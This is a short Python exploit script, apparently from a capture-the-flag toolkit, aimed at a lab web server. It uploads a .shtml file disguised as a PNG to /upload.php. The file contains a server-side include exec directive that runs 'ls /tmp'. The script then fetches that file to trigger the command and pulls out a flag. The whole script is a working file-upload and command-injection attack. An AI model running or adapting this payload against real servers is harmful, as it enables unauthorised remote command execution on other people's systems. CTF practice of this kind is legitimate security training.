from tool.base import match_flag, process_with
from tool.http_repeater import repeater


def run(target: tuple[str, int]):
    exp1 = f"""POST /upload.php HTTP/1.1
Host: {target[0]}:{target[1]}
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBuYBAMhaa3DodsnC

------WebKitFormBoundaryBuYBAMhaa3DodsnC
Content-Disposition: form-data; name="file_upload"; filename="flag.shtml"
Content-Type: image/png

<!--#exec cmd="ls /tmp" -->
------WebKitFormBoundaryBuYBAMhaa3DodsnC--
"""

    exp2 = f"""GET /flag.shtml HTTP/1.1
Host: {target[0]}:{target[1]}
Connection: close

"""

    exps = [exp1, exp2]
    resp = None
    for e in exps:
        resp = repeater(e)
        if not resp:
            return False, "", resp.error

    if not resp:
        return False, "", "no response"

    flag = match_flag(resp.text())
    if not flag:
        print(resp.text())
        return False, "", "flag匹配失败"

    return True, flag, ""


def main(ip_port: str):
    process_with(ip_port, run)


if __name__ == "__main__":
    main("192.168.192.148:25947")
